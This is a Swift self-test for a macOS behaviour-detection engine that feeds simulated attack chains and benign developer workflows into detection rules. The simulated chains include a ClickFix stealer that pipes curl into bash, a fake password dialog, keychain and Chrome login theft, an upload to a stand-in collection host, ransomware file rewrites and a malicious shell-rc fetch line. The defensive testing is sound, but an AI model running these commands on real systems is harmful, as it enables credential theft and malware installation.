import Foundation
import RampartShared
import RampartBehaviour

// Owned by the behaviour build agent. Add checks with check(cond, "name").
// Every "attack" below is a synthetic SecurityEvent (plain data); no command is executed.

/// Synthetic event driver.
final class BehaviourSim {
    let engine: BehaviourEngine
    var t = Date(timeIntervalSince1970: 1_800_000_000)
    var nextPid: Int32 = 2000
    var procs: [Int32: ProcessInfoLite] = [:]
    var detections: [Detection] = []

    init(_ engine: BehaviourEngine) { self.engine = engine }

    func feed(_ e: SecurityEvent) { detections += engine.process(e) }

    @discardableResult
    func exec(_ path: String, _ args: [String] = [], parent: Int32, team: String? = nil, dt: TimeInterval = 0.2,
              pid: Int32? = nil, detail: [String: String] = [:]) -> Int32 {
        t += dt
        let p = pid ?? { nextPid += 1; return nextPid }()
        let platform = path.hasPrefix("/System/") || path.hasPrefix("/usr/bin/") || path.hasPrefix("/bin/") || path.hasPrefix("/usr/sbin/") || path.hasPrefix("/sbin/") || path.hasPrefix("/usr/libexec/")
        let info = ProcessInfoLite(pid: p, ppid: parent, path: path, args: args.isEmpty ? [path] : [path] + args, uid: 501,
                                   teamID: team, isPlatformBinary: platform)
        procs[p] = info
        var d = detail; d["start"] = String(t.timeIntervalSince1970) + ".\(p)"
        feed(SecurityEvent(date: t, kind: .exec, process: info, path: path, detail: d, source: "test"))
        return p
    }

    func file(_ kind: SecurityEventKind, _ path: String, dest: String? = nil, by pid: Int32?, detail: [String: String] = [:], dt: TimeInterval = 0.05) {
        t += dt
        feed(SecurityEvent(date: t, kind: kind, process: pid.flatMap { procs[$0] }, path: path, destPath: dest, detail: detail, source: "test"))
    }

    func other(_ kind: SecurityEventKind = .other, by pid: Int32?, path: String? = nil, detail: [String: String], dt: TimeInterval = 0.2) {
        t += dt
        feed(SecurityEvent(date: t, kind: kind, process: pid.flatMap { procs[$0] }, path: path, detail: detail, source: "test"))
    }

    func exit(_ pid: Int32) {
        t += 0.1
        feed(SecurityEvent(date: t, kind: .other, process: procs[pid], detail: ["es_event": "exit"], source: "test"))
    }

    var ruleIDs: Set<String> {
        Set(detections.flatMap { $0.evidence.map { String($0.title.split(separator: " ").first ?? "") } })
    }
    var maxConfidence: Int { detections.map(\.confidence).max() ?? 0 }

    /// Standard session: launchd → Terminal → login → zsh. Returns zsh pid.
    func terminalSession() -> Int32 {
        exec("/sbin/launchd", parent: 0, pid: 1)
        let term = exec("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", parent: 1)
        let login = exec("/usr/bin/login", ["-pf", "user"], parent: term)
        return exec("/bin/zsh", ["-zsh"], parent: login)
    }
}

/// Test signing oracle (stands in for RampartSigning).
let behaviourTestSigning: SigningProvider = { path in
    if path.hasPrefix("/System/") || path.hasPrefix("/usr/bin/") || path.hasPrefix("/bin/") || path.hasPrefix("/usr/sbin/") || path.hasPrefix("/sbin/") || path.hasPrefix("/usr/libexec/") {
        return SigningInfo(status: .apple)
    }
    if path.hasPrefix("/Applications/") { return SigningInfo(status: .developerID, teamID: "EQHXZ8M8AV", notarized: true) }
    if path.hasPrefix("/opt/homebrew/") || path.contains("/.build/") || path.contains("/go-build") { return SigningInfo(status: .adHoc) }
    if path.hasPrefix("/tmp/") || path.hasPrefix("/private/tmp/") || path.hasPrefix("/Users/Shared/") || path.contains("/Downloads/") { return SigningInfo(status: .unsigned) }
    return nil
}

extension SelfTest {
    static func behaviour() {
        let fm = FileManager.default
        let scratch = (ProcessInfo.processInfo.environment["RAMPART_SCRATCH"] ?? NSTemporaryDirectory())
            + "/rampart-behaviour-\(UUID().uuidString.prefix(8))"
        try? fm.createDirectory(atPath: scratch, withIntermediateDirectories: true)
        defer { try? fm.removeItem(atPath: scratch) }
        let home = NSHomeDirectory()

        // --- Rule file ---
        let rs = RuleSet.default
        let problems = rs.validate()
        check(problems.isEmpty, "rule set validates: \(problems.prefix(3))")
        let catalogue = Set(rs.rules.map(\.id).filter { $0.hasPrefix("R") && $0.count == 3 && Int($0.dropFirst()) != nil })
        check(catalogue.count >= 56, "≥56 of the 58 catalogue rules present (\(catalogue.count))")
        print("   rules: \(rs.rules.count) total, \(catalogue.count) catalogue IDs")

        // --- Entropy helpers ---
        var rng = SystemRandomNumberGenerator()
        let random = Data((0..<8192).map { _ in UInt8.random(in: 0...255, using: &rng) })
        let text = Data(String(repeating: "The quick brown fox jumps over the lazy dog. ", count: 200).utf8)
        check(RansomwareDetector.shannonEntropy(random) > 7.9, "random entropy ~8")
        check(RansomwareDetector.shannonEntropy(text) < 5, "text entropy low")
        check(RansomwareDetector.looksEncrypted(random), "random looks encrypted")
        check(!RansomwareDetector.looksEncrypted(text), "text not encrypted")
        check(!RansomwareDetector.looksEncrypted(Data([0x50, 0x4B, 0x03, 0x04]) + random), "zip magic exempt")

        // --- Lineage + pid reuse ---
        do {
            let tr = ProcessTracker()
            let d0 = Date()
            func ev(_ pid: Int32, _ ppid: Int32, _ path: String, start: String?, _ dt: Double, kind: SecurityEventKind = .exec, detail: [String: String] = [:]) -> ProcessNode? {
                var d = detail; if let start { d["start"] = start }
                return tr.observe(SecurityEvent(date: d0.addingTimeInterval(dt), kind: kind,
                    process: ProcessInfoLite(pid: pid, ppid: ppid, path: path), path: path, detail: d, source: "t"))
            }
            _ = ev(100, 1, "/Applications/Safari.app/Contents/MacOS/Safari", start: "1", 0)
            _ = ev(200, 1, "/bin/zsh", start: "2", 0.1)
            let a = ev(300, 100, "/bin/sh", start: "3", 0.2)
            check(tr.ancestors(of: a!).first?.name == "Safari", "lineage parent resolved")
            let a2 = ev(300, 100, "/usr/bin/curl", start: "3", 0.3, detail: ["exec_replace": "1"])
            check(a2?.key == a?.key && a2?.images.count == 2, "exec in place keeps the same process")
            _ = tr.observe(SecurityEvent(date: d0.addingTimeInterval(0.4), kind: .other, process: ProcessInfoLite(pid: 300, ppid: 100, path: "/usr/bin/curl"), detail: ["exit": "1"], source: "t"))
            let b = ev(300, 200, "/bin/ls", start: "9", 0.5)
            check(b != nil && b!.key.gen == a!.key.gen + 1, "pid reuse after exit gets new generation")
            check(tr.ancestors(of: b!).first?.name == "zsh", "reused pid has new parent chain")
            let c = ev(300, 200, "/bin/cat", start: "10", 0.6)
            check(c!.key.gen == b!.key.gen + 1, "pid reuse detected from start-time change without exit")
            check(tr.node(a!.key)?.exitDate != nil, "old generation kept after exit")
            // fork creates a new generation for the child pid
            let parent = ev(400, 200, "/bin/bash", start: "11", 0.7)
            _ = tr.observe(SecurityEvent(date: d0.addingTimeInterval(0.8), kind: .other, process: ProcessInfoLite(pid: 400, ppid: 200, path: "/bin/bash"),
                                         detail: ["es_event": "fork", "child_pid": "300"], source: "t"))
            let forked = tr.liveNode(pid: 300)
            check(forked != nil && forked!.key.gen == c!.key.gen + 1 && forked!.parent == parent!.key, "fork child gets new gen and parent")
        }

        // --- Malicious 1: ClickFix → stealer chain ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
            sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
            let bash = sim.exec("/bin/bash", ["-c", "curl -fsSL https://update-check.example/i.sh | bash"], parent: zsh)
            sim.exec("/usr/bin/curl", ["-fsSL", "-o", "/tmp/.x/update", "https://update-check.example/u"], parent: bash)
            sim.exec("/bin/chmod", ["+x", "/tmp/.x/update"], parent: bash)
            let up = sim.exec("/tmp/.x/update", parent: bash)
            sim.exec("/usr/bin/osascript", ["-e", "display dialog \"macOS needs your password\" default answer \"\" with hidden answer"], parent: up)
            sim.exec("/usr/bin/dscl", [".", "-authonly", "user", "x"], parent: up)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome"], parent: up)
            let cp = sim.exec("/bin/cp", ["\(home)/Library/Application Support/Google/Chrome/Default/Login Data", "/tmp/.x/c/"], parent: up)
            sim.file(.fileCreate, "/tmp/.x/c/Login Data", by: cp)
            sim.exec("/usr/bin/ditto", ["-c", "-k", "--sequesterRsrc", "/tmp/.x/c", "/tmp/.x/out.zip"], parent: up)
            sim.exec("/usr/bin/curl", ["-F", "f=@/tmp/.x/out.zip", "https://collect.example/up"], parent: up)
            let ids = sim.ruleIDs
            for r in ["R31", "R30", "L05", "R29", "R34", "R35", "R36", "R37", "R38", "R43", "R40"] {
                check(ids.contains(r), "stealer chain fires \(r)")
            }
            check(sim.detections.contains { $0.severity == .critical && $0.category == .infostealer }, "stealer chain is critical infostealer")
            check(Set(sim.detections.map(\.id)).count == 1, "whole chain is one story (\(Set(sim.detections.map(\.id)).count))")
            if let d = sim.detections.last { print("   stealer: \(d.name) conf=\(d.confidence) evidence=\(d.evidence.count)") }
            check(sim.detections.last?.evidence.contains { $0.detail.contains("Started by:") } ?? false, "evidence explains lineage")
        }

        // --- Malicious 2: browser → shell → interpreter chain; persistence via script lineage ---
        do {
            let la = scratch + "/LaunchAgents"
            try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
            let label = "com.rampart.test.\(UUID().uuidString)"
            let plist = la + "/\(label).plist"
            let obj: [String: Any] = ["Label": label, "ProgramArguments": ["/Users/Shared/.cache/agent", "--daemon"], "RunAtLoad": true,
                                      "EnvironmentVariables": ["DYLD_INSERT_LIBRARIES": "/Users/Shared/.cache/libhook.dylib"]]
            try? PropertyListSerialization.data(fromPropertyList: obj, format: .xml, options: 0).write(to: URL(fileURLWithPath: plist))
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            let chrome = sim.exec("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", parent: 1)
            let sh = sim.exec("/bin/sh", ["-c", "python3 -c 'x'"], parent: chrome)
            let py = sim.exec("/usr/bin/python3", ["-c", "import os"], parent: sh)
            sim.file(.fileCreate, plist, by: py)
            sim.exec("/bin/launchctl", ["bootstrap", "gui/501", plist], parent: sh)
            let ids = sim.ruleIDs
            for r in ["L08", "R08", "R07", "R09"] { check(ids.contains(r), "browser chain / persistence fires \(r)") }
            check(sim.maxConfidence >= 90, "browser→script persistence reaches critical (\(sim.maxConfidence))")
        }

        // --- Malicious 3: ransomware ---
        do {
            let docs = scratch + "/Docs"
            try? fm.createDirectory(atPath: docs + "/a", withIntermediateDirectories: true)
            try? fm.createDirectory(atPath: docs + "/b", withIntermediateDirectories: true)
            let rw = RansomwareDetector(config: RansomwareConfig(protectedRoots: [docs]))
            let canaries = rw.plantCanaries(in: [docs])
            check(canaries.count == 2, "two canaries planted")
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning, ransomware: rw))
            let zsh = sim.terminalSession()
            let locker = sim.exec("/tmp/locker", parent: zsh)
            // R03: a real PDF-looking file rewritten with random data
            let pdf = docs + "/a/report.pdf"
            fm.createFile(atPath: pdf, contents: Data("%PDF-1.7\n".utf8) + text)
            sim.file(.fileCreate, pdf, by: nil)
            fm.createFile(atPath: pdf, contents: random)
            sim.file(.fileWrite, pdf, by: locker)
            // R02: burst of encrypted outputs
            for i in 0..<11 {
                let p = docs + "/\(i % 2 == 0 ? "a" : "b")/file\(i).dat"
                fm.createFile(atPath: p, contents: Data((0..<4096).map { _ in UInt8.random(in: 0...255, using: &rng) }))
                sim.file(.fileWrite, p, by: locker)
            }
            // R04: mass rename to one new extension
            for i in 0..<20 { sim.file(.fileRename, docs + "/a/doc\(i).txt", dest: docs + "/a/doc\(i).txt.locked", by: locker) }
            // R05: ransom notes
            for d in ["a", "b", "c", "d", "e"] { sim.file(.fileCreate, docs + "/\(d)/HOW_TO_RECOVER.txt", by: locker) }
            // R01: canary modified
            try? Data("encrypted".utf8).write(to: URL(fileURLWithPath: canaries[0]))
            sim.file(.fileWrite, canaries[0], by: locker)
            let ids = sim.ruleIDs
            for r in ["R01", "R02", "R03", "R04", "R05"] { check(ids.contains(r), "ransomware fires \(r)") }
            check(sim.detections.contains { $0.category == .ransomware && $0.severity == .critical }, "ransomware critical")
            // Canary touched without content change is not a hit
            let rw2 = RansomwareDetector(config: RansomwareConfig(protectedRoots: [docs]))
            let c2 = rw2.plantCanaries(in: [docs + "/b"])
            check(rw2.observe(SecurityEvent(kind: .fileClose, path: c2[0], detail: ["modified": "0"], source: "t"), actorKey: "x").isEmpty,
                  "unchanged canary read is not a hit")
        }

        // --- Malicious 4: quarantine strip then exec; keylogger; TCC burst; beacon; self-delete; R12 rc line ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            sim.exec("/usr/bin/xattr", ["-dr", "com.apple.quarantine", "\(home)/Downloads/FreeApp.app"], parent: zsh)
            let app = sim.exec("\(home)/Downloads/FreeApp.app/Contents/MacOS/FreeApp", parent: 1)
            check(sim.ruleIDs.contains("R27"), "quarantine strip then exec fires R27")
            sim.other(by: app, detail: ["type": "eventTap", "keyboard": "1"])
            check(sim.ruleIDs.contains("R48"), "untrusted keyboard tap fires R48")
            for s in ["kTCCServiceCamera", "kTCCServiceMicrophone", "kTCCServiceScreenCapture"] {
                sim.other(.tccRequest, by: app, detail: ["service": s])
            }
            check(sim.ruleIDs.contains("R52"), "TCC burst fires R52")
            for _ in 0..<8 { sim.other(.networkConnect, by: app, detail: ["remote_ip": "203.0.113.7", "remote_port": "443"], dt: 300) }
            check(sim.ruleIDs.contains("R41"), "first connection fires R41")
            check(sim.ruleIDs.contains("R46"), "fixed-interval connections fire R46")
            sim.file(.fileDelete, "\(home)/Downloads/FreeApp.app/Contents/MacOS/FreeApp", by: nil)
            check(sim.ruleIDs.contains("R58"), "self-deleting binary fires R58")
            let rc = scratch + "/.zshrc"
            try? "export PATH=$PATH:/opt/homebrew/bin\n".write(toFile: rc, atomically: true, encoding: .utf8)
            sim.engine.seedShellRC(rc)
            try? "export PATH=$PATH:/opt/homebrew/bin\ncurl -s https://x.example/p | sh &\n".write(toFile: rc, atomically: true, encoding: .utf8)
            sim.file(.fileWrite, rc, by: app)
            check(sim.ruleIDs.contains("R12"), "shell rc fetch line fires R12")
            sim.exec("/usr/bin/security", ["add-trusted-cert", "-d", "-r", "trustRoot", "/tmp/ca.pem"], parent: app)
            check(sim.ruleIDs.contains("R24"), "root cert add fires R24")
        }

        // --- Learning mode + allowlist ---
        do {
            var cfg = BehaviourConfig(); cfg.learningMode = true
            let sim = BehaviourSim(BehaviourEngine(config: cfg, signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let tool = sim.exec("/tmp/tool", parent: zsh)          // R29 weak → observation only
            check(sim.detections.isEmpty && sim.engine.observations.contains { $0.ruleID == "R29" }, "learning mode records weak hit without alerting")
            sim.exec("/usr/bin/security", ["find-generic-password", "-s", "Chrome Safe Storage"], parent: tool)
            check(sim.ruleIDs.contains("R36"), "alwaysActive R36 still fires in learning mode")

            let sim2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim2.engine.allow(AllowEntry(teamID: "TEAMOK1234", note: "user allowed"))
            let z2 = sim2.terminalSession()
            let ok = sim2.exec("/Users/Shared/tool", parent: z2, team: "TEAMOK1234")
            sim2.exec("/usr/bin/security", ["find-generic-password", "-s", "Chrome Safe Storage"], parent: ok)
            check(sim2.detections.isEmpty, "allowlisted Team ID suppresses lineage rules")
        }

        // --- Benign 1: Homebrew install pasted from brew.sh ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
            sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
            let bash = sim.exec("/bin/bash", ["-c", "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"], parent: zsh)
            sim.exec("/usr/bin/curl", ["-fsSL", "https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh"], parent: zsh)
            for tool in ["/usr/bin/uname", "/usr/bin/sw_vers", "/usr/sbin/sysctl", "/usr/bin/xcode-select"] { sim.exec(tool, ["-a"], parent: bash) }
            let sudo = sim.exec("/usr/bin/sudo", ["/bin/mkdir", "-p", "/opt/homebrew"], parent: bash)
            sim.exec("/bin/mkdir", ["-p", "/opt/homebrew"], parent: sudo)
            sim.exec("/usr/bin/git", ["clone", "https://github.com/Homebrew/brew", "/opt/homebrew"], parent: bash)
            let ruby = sim.exec("/opt/homebrew/Library/Homebrew/vendor/portable-ruby/current/bin/ruby", ["-W1", "brew.rb", "update"], parent: bash)
            for tool in ["/usr/bin/sw_vers", "/usr/bin/uname", "/usr/sbin/sysctl"] { sim.exec(tool, parent: ruby) }
            let curl = sim.exec("/usr/bin/curl", ["-o", "\(home)/Library/Caches/Homebrew/portable-ruby.tar.gz", "https://ghcr.io/v2/homebrew/x"], parent: ruby)
            sim.file(.fileCreate, "\(home)/Library/Caches/Homebrew/portable-ruby.tar.gz", by: curl)
            sim.exec("/usr/bin/tar", ["-xzf", "\(home)/Library/Caches/Homebrew/portable-ruby.tar.gz", "-C", "/opt/homebrew/Cellar"], parent: ruby)
            sim.file(.fileWrite, "\(home)/.zprofile", by: zsh, detail: ["added_lines": "eval \"$(/opt/homebrew/bin/brew shellenv)\""])
            let brew = sim.exec("/opt/homebrew/bin/brew", ["install", "wget"], parent: zsh)
            sim.exec("/opt/homebrew/Library/Homebrew/vendor/portable-ruby/current/bin/ruby", ["brew.rb", "install", "wget"], parent: brew)
            sim.exec("/opt/homebrew/bin/brew", ["services", "start", "postgresql"], parent: zsh)
            sim.file(.fileCreate, "\(home)/Library/LaunchAgents/homebrew.mxcl.postgresql@16.plist", by: ruby)
            check(sim.detections.isEmpty, "Homebrew install produces no detections (\(sim.ruleIDs.sorted()))")
        }

        // --- Benign 2: developer workflow without Xcode ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let proj = "\(home)/src/app"
            let swiftp = sim.exec("/usr/bin/swift", ["build"], parent: zsh, detail: ["cwd": proj])
            let sb = sim.exec("/Library/Developer/CommandLineTools/usr/bin/swift-build", parent: swiftp)
            sim.exec("/Library/Developer/CommandLineTools/usr/bin/swift-frontend", ["-c", "main.swift"], parent: sb)
            sim.exec("/usr/bin/ld", ["-o", "\(proj)/.build/debug/app"], parent: sb)
            sim.file(.fileCreate, "\(proj)/.build/debug/app", by: sb)
            sim.exec("/usr/bin/codesign", ["--force", "--sign", "-", "\(proj)/.build/debug/app"], parent: zsh, detail: ["cwd": proj])
            let app = sim.exec("\(proj)/.build/debug/app", ["--selftest"], parent: zsh)
            sim.exec("/bin/sh", ["-c", "echo ok"], parent: app)
            sim.exec("/usr/bin/git", ["commit", "-m", "wip"], parent: zsh)
            let npm = sim.exec("/opt/homebrew/bin/node", ["/opt/homebrew/bin/npm", "install"], parent: zsh)
            let post = sim.exec("/bin/sh", ["-c", "node scripts/postinstall.js"], parent: npm)
            sim.exec("/opt/homebrew/bin/node", ["scripts/postinstall.js"], parent: post)
            let goRun = sim.exec("/opt/homebrew/bin/go", ["run", "main.go"], parent: zsh)
            sim.exec("/private/var/folders/xy/abc123/T/go-build998877/b001/exe/main", parent: goRun)
            sim.exec("/bin/sh", ["-c", "curl -sSf https://sh.rustup.rs | sh"], parent: zsh)
            sim.exec("/usr/bin/python3", ["-m", "venv", ".venv"], parent: zsh)
            sim.exec("/usr/bin/ssh-add", ["\(home)/.ssh/id_ed25519"], parent: zsh)
            sim.exec("/usr/bin/tar", ["-czf", "dist.tgz", "build/"], parent: zsh, detail: ["cwd": proj])
            sim.exec("/usr/bin/xattr", ["-l", "\(proj)/README.md"], parent: zsh)
            sim.exec("/bin/zsh", ["-c", "nohup ./server &"], parent: zsh)
            check(!sim.detections.contains { $0.confidence >= 60 }, "developer workflow raises no alerts (\(sim.ruleIDs.sorted()))")
            check(sim.detections.isEmpty, "developer workflow produces no detections at all (\(sim.ruleIDs.sorted()))")
        }

        // --- Parsers on fixture strings ---
        do {
            let btm = """
            ========================
             Records for UID 501 : 8A908F12-CFCA-4ED9-B1B0-B705570C8D61
            ========================
             Items:
             #1:
                             UUID: 11111111-0000-0000-0000-000000000001
                             Name: Docker
                   Developer Name: Docker
                             Type: developer (0x20)
             #2:
                             UUID: 11111111-0000-0000-0000-000000000002
                             Name: com.docker.vmnetd
                  Team Identifier: 9BNSXJN65R
                             Type: legacy daemon (0x10010)
                      Disposition: [enabled, allowed, notified] (0xb)
                       Identifier: 16.com.docker.vmnetd
                              URL: /Library/LaunchDaemons/com.docker.vmnetd.plist
                  Executable Path: /Library/PrivilegedHelperTools/com.docker.vmnetd
             #3:
                             UUID: 11111111-0000-0000-0000-000000000003
                             Name: Helper
                             Type: login item (0x4)
                              URL: /Applications/Helper.app
                  Executable Path: Contents/MacOS/Helper
            """
            let b = PersistenceScanner.parseBTM(btm)
            check(b.count == 2, "BTM parse skips developer headers (\(b.count))")
            check(b.first { $0.item.label == "com.docker.vmnetd" }?.attributes["teamID"] == "9BNSXJN65R", "BTM team id")
            check(b.first { $0.item.kind == .loginItem }?.item.target == "/Applications/Helper.app/Contents/MacOS/Helper", "BTM relative exe resolved")
            let sx = PersistenceScanner.parseSystemExtensions("1 extension(s)\n--- com.apple.system_extension.driver_extension (x)\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n*\t*\t5JZGQTGU4W\tcn.wch.CH34xVCPDriver (1.0/1)\tcn.wch.CH34xVCPDriver\t[activated enabled]\n")
            check(sx.count == 1 && sx[0].attributes["teamID"] == "5JZGQTGU4W" && sx[0].attributes["version"] == "1.0/1", "systemextensionsctl parse")
            let pr = PersistenceScanner.parseProfiles("user[1] attribute: profileIdentifier: com.example.proxy\nThere are 1 user configuration profiles installed for 'user'\n")
            check(pr.count == 1 && pr[0].item.label == "com.example.proxy", "profiles parse")
            let cr = PersistenceScanner.parseCrontab("# c\nPATH=/bin\n*/5 * * * * /Users/Shared/.u/run.sh >/dev/null\n@reboot /tmp/x\n", source: "crontab:u")
            check(cr.count == 2 && cr[0].item.target == "/Users/Shared/.u/run.sh", "crontab parse")
            let keyBlob = Data((0..<51).map { UInt8($0) }).base64EncodedString()
            let ak = PersistenceScanner.parseAuthorizedKeys("no-pty ssh-ed25519 \(keyBlob) attacker@box\n# x\n", path: "/x/authorized_keys")
            check(ak.count == 1 && ak[0].attributes["comment"] == "attacker@box" && ak[0].attributes["fingerprint"]?.hasPrefix("SHA256:") == true, "authorized_keys parse")
            let ff = PersistenceScanner.parseFirefoxAddons([
                ["id": "a@b", "type": "extension", "location": "app-profile", "defaultLocale": ["name": "Helper"], "sourceURI": "https://addons.mozilla.org/x.xpi",
                 "userPermissions": ["permissions": ["cookies"], "origins": ["<all_urls>"]]],
                ["id": "builtin@mozilla", "type": "extension", "location": "app-builtin"]], profileDir: "/p")
            check(ff.count == 1 && ff[0].item.label == "Firefox: Helper" && ff[0].attributes["fromWebstore"] == "1", "firefox addons parse")
            check(PersistenceScanner.suspiciousShellLines("export PATH=/a\neval \"$(/opt/homebrew/bin/brew shellenv)\"\ncurl -s http://x | bash\n").count == 1, "rc line classifier")

            // Chromium extension fixture with __MSG_ name and sideload flag
            let prof = scratch + "/Chrome/Default"
            let ext = prof + "/Extensions/abcdefghijklmnopabcdefghijklmnop/1.2_0"
            try? fm.createDirectory(atPath: ext + "/_locales/en", withIntermediateDirectories: true)
            try? #"{"name":"__MSG_appName__","default_locale":"en","version":"1.2","permissions":["cookies","nativeMessaging"],"host_permissions":["<all_urls>"]}"#.write(toFile: ext + "/manifest.json", atomically: true, encoding: .utf8)
            try? #"{"appName":{"message":"Coupon Helper"}}"#.write(toFile: ext + "/_locales/en/messages.json", atomically: true, encoding: .utf8)
            try? #"{"extensions":{"settings":{"abcdefghijklmnopabcdefghijklmnop":{"from_webstore":false,"location":4}}}}"#.write(toFile: prof + "/Secure Preferences", atomically: true, encoding: .utf8)
            let ce = PersistenceScanner(config: PersistenceScanConfig(home: scratch, kinds: [.browserExtension], runCommands: false))
            _ = ce
            let recs = PersistenceScannerFixtures.chromium(profileDir: prof)
            check(recs.count == 1 && recs[0].item.label == "Chrome (Default): Coupon Helper", "chromium manifest name resolved (\(recs.first?.item.label ?? "-"))")
            let eng = BehaviourEngine(signing: behaviourTestSigning)
            let dets = eng.evaluatePersistence(added: recs)
            let rids = Set(dets.flatMap { $0.evidence.map { String($0.title.prefix(3)) } })
            check(rids.contains("R20") && rids.contains("R21"), "sideloaded high-permission extension fires R20+R21 (\(rids.sorted()))")
        }

        // --- Differ on a scratch LaunchAgents dir ---
        do {
            let la = scratch + "/DifferAgents"
            try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
            var cfg = PersistenceScanConfig(home: scratch, kinds: [.launchAgent], runCommands: false)
            cfg.launchAgentDirs = [la]
            let sc = PersistenceScanner(config: cfg, signing: behaviourTestSigning)
            let base = PersistenceSnapshot(records: sc.scanRecords())
            let baseURL = URL(fileURLWithPath: scratch + "/baseline.json")
            try? base.save(to: baseURL)
            let label = "com.rampart.test.\(UUID().uuidString)"
            let p = la + "/\(label).plist"
            let obj: [String: Any] = ["Label": label, "ProgramArguments": ["/tmp/com.rampart.test.bin"], "RunAtLoad": true]
            try? PropertyListSerialization.data(fromPropertyList: obj, format: .xml, options: 0).write(to: URL(fileURLWithPath: p))
            let loaded = (try? PersistenceSnapshot.load(from: baseURL)) ?? base
            let now = PersistenceSnapshot(records: sc.scanRecords())
            let diff = PersistenceDiffer.diff(baseline: loaded, current: now)
            check(diff.added.count == 1 && diff.added[0].item.label == label, "differ detects new com.rampart.test plist")
            check(diff.added.first?.item.target == "/tmp/com.rampart.test.bin" && diff.added.first?.attributes["runAtLoad"] == "1", "plist ProgramArguments parsed")
            let eng = BehaviourEngine(signing: behaviourTestSigning)
            let dets = eng.evaluatePersistence(added: diff.added)
            check(dets.contains { $0.evidence.contains { $0.title.hasPrefix("R07") } && $0.confidence >= 60 }, "new agent → untrusted temp target alerts (R07)")
            // via the event path too
            let evDets = diff.events().flatMap { BehaviourEngine(signing: behaviourTestSigning).process($0) }
            check(evDets.contains { $0.evidence.contains { $0.title.hasPrefix("R07") } }, "differ events feed the engine")
            let obj2: [String: Any] = ["Label": label, "ProgramArguments": ["/tmp/com.rampart.test.bin", "--x"]]
            try? PropertyListSerialization.data(fromPropertyList: obj2, format: .xml, options: 0).write(to: URL(fileURLWithPath: p))
            let d2 = PersistenceDiffer.diff(baseline: now, current: PersistenceSnapshot(records: sc.scanRecords()))
            check(d2.changed.count == 1, "differ detects changed plist")
            try? fm.removeItem(atPath: p)
            let d3 = PersistenceDiffer.diff(baseline: now, current: PersistenceSnapshot(records: sc.scanRecords()))
            check(d3.removed.count == 1, "differ detects removed plist")
        }

        // --- Live scan of this Mac (read-only) ---
        do {
            let t0 = Date()
            let recs = PersistenceScanner().scanRecords()
            let byKind = Dictionary(grouping: recs, by: { $0.item.kind.rawValue }).mapValues(\.count)
            print("   live scan: \(recs.count) items in \(String(format: "%.1f", Date().timeIntervalSince(t0))) s: \(byKind.sorted { $0.key < $1.key })")
            check(recs.count > 0, "live persistence scan returns items")
            check(Set(recs.map(\.id)).count == recs.count, "live scan ids unique")
            check(!recs.contains { $0.item.kind == .browserExtension && $0.item.label.contains("__MSG_") }, "live extension names resolved from _locales")
            for r in recs where r.item.kind == .browserExtension { print("     ext: \(r.item.label)") }
            let snap = PersistenceSnapshot(records: recs)
            check(PersistenceDiffer.diff(baseline: snap, current: snap).isEmpty, "self-diff is empty")
        }
    }
}

/// Small shim so the self-test can call the internal chromium parser through a public entry.
enum PersistenceScannerFixtures {
    static func chromium(profileDir: String) -> [PersistenceRecord] {
        PersistenceScanner.chromiumExtensionRecords(profileDir: profileDir, browser: "Chrome")
    }
}
